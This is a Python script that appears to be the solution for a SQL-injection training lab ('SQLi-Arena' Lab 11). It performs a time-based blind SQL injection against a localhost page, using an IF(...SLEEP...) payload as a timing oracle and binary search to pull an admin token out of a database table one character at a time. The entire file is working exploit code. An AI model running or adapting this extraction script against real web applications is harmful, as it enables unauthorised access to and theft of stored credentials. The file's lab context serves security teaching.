#!/usr/bin/env python3
"""
Lab 11 -- Time-Based Blind SQLi: SLEEP() + IF + Binary Search
=============================================================
Extracts the admin token using response timing as the oracle.
No visible output difference -- only response delay indicates TRUE.

Usage:
    python3 lab11_blind_time.py [TARGET_URL]

Default target: http://localhost/SQLi-Arena/public/lab.php
"""
import requests
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
PARAMS_BASE = {"lab": "mysql/lab11", "mode": "black"}

SLEEP_SEC = 1       # seconds to sleep on TRUE (multiplied by matching rows)
THRESHOLD = 2.0     # if response takes longer than this, it's TRUE
RETRIES = 2         # Note: SLEEP fires per-row. With 5 session rows, SLEEP(1) → ~5s delay.         # retry on ambiguous timing


def timed_check(condition):
    """Inject a condition inside IF(cond, SLEEP(n), 0). Return True if delayed."""
    payload = f"' OR IF({condition}, SLEEP({SLEEP_SEC}), 0) -- -"
    params = {**PARAMS_BASE, "token": payload}

    for attempt in range(RETRIES):
        start = time.time()
        requests.get(TARGET, params=params)
        elapsed = time.time() - start
        if elapsed > THRESHOLD:
            return True
        if attempt == 0 and elapsed > THRESHOLD * 0.5:
            # Ambiguous -- retry once
            continue
        return False
    return False


def find_length(subquery, max_len=50):
    """Find the length of a subquery result using time-based binary search."""
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        if timed_check(f"({subquery}) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low


def extract_char(subquery, pos):
    """Extract one character at position pos via time-based binary search."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if timed_check(f"ASCII(SUBSTRING(({subquery}),{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else "?"


# ── Step 1: Confirm the timing oracle ──
print(f"[*] Target: {TARGET}")
print(f"[*] SLEEP duration: {SLEEP_SEC}s | Threshold: {THRESHOLD}s")
print("[*] Confirming time-based oracle...")

start = time.time()
requests.get(TARGET, params={**PARAMS_BASE, "token": f"' OR SLEEP({SLEEP_SEC}) -- -"})
elapsed = time.time() - start

if elapsed < THRESHOLD:
    print(f"[-] ERROR: SLEEP did not cause delay (elapsed: {elapsed:.2f}s)")
    print("[-] Check TARGET URL and that the lab is running.")
    sys.exit(1)
print(f"[+] Time-based oracle confirmed (SLEEP caused {elapsed:.2f}s delay)")

# ── Step 2: Find the token length ──
SUBQUERY = "SELECT token FROM admin_tokens LIMIT 1"
LENGTH_SUBQUERY = "SELECT LENGTH(token) FROM admin_tokens LIMIT 1"

print("[*] Finding token length (this may take a moment)...")
length = find_length(LENGTH_SUBQUERY)
print(f"[+] Token length: {length}")

# ── Step 3: Extract character by character ──
est_time = length * 7 * SLEEP_SEC * 0.5  # rough estimate (half the checks trigger sleep)
print(f"[*] Extracting token ({length} chars, ~{est_time:.0f}s estimated)...")
flag = ""
overall_start = time.time()
for pos in range(1, length + 1):
    c = extract_char(SUBQUERY, pos)
    flag += c
    elapsed_total = time.time() - overall_start
    print(f"  [{pos:2d}/{length}] {flag}  ({elapsed_total:.1f}s elapsed)")

print(f"\n[+] Token: {flag}")
print(f"[*] Total time: {time.time() - overall_start:.1f}s")
